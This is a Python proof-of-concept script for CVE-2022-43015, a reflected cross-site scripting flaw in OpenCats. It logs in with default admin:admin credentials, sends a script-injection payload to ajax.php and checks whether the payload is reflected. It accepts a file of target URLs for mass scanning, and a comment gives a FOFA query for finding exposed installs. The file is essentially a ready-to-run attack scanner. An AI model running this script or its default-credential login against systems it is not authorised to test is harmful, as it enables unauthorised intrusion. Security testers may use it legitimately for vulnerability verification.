#!/usr/bin/env python
# -*- conding:utf-8 -*-
# OpenCats XSS
# fofa:title="OpenCats"

import requests
import argparse
import sys
import urllib3
from termcolor import cprint
urllib3.disable_warnings()
color = "green"

def title():
    cprint("""
  _____ __      __ ______          ___    ___   ___   ___           _  _    ____    ___   __  _  _   
 / ____|\ \    / /|  ____|        |__ \  / _ \ |__ \ |__ \         | || |  |___ \  / _ \ /_ || || |  
| |      \ \  / / | |__    ______    ) || | | |   ) |   ) | ______ | || |_   __) || | | | | || || |_ 
| |       \ \/ /  |  __|  |______|  / / | | | |  / /   / / |______||__   _| |__ < | | | | | ||__   _|
| |____    \  /   | |____          / /_ | |_| | / /_  / /_            | |   ___) || |_| | | |   | |  
 \_____|    \/    |______|        |____| \___/ |____||____|           |_|  |____/  \___/  |_|   |_|  
                                                                                                                                         

                                                                                                                                                                                                         
                                                                               Author:Henry4E36
               """,color)


class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file
    

    def target_url(self):
        color = "red"
        payload1 = self.url + "/index.php?m=login&a=attemptLogin"
        payload2 = self.url + '/ajax.php?f=getPipelineJobOrder&joborderID=1&page=0&entriesPerPage=1&sortBy=dateCreatedInt&sortDirection=desc&indexFile=15)"></a><script>alert(document.domain)</script>&isPopup=0'
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "username=admin&password=admin" 
        session = requests.session()
        try:
            login_res = session.post(url=payload1, headers=headers,data=data,verify=False,timeout=5)
            res = session.get(url=payload2, headers=headers,verify=False, timeout=5)
            if res.status_code == 200 and "<script>alert(document.domain)</script>" in res.text:
                cprint(f"[{chr(8730)}] 目标系统: {self.url} 存在XSS!" ,color)
            else:               
                cprint(f"[x] 目标系统: {self.url} 不存在XSS!")
        except Exception as e:
            print(f"[x] 目标系统: {self.url} 连接错误！")


    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description='OpenCats XSS')
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 CVE-2022-43015.py -u http://127.0.0.1\neg2:>>>python3 CVE-2022-43015 -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()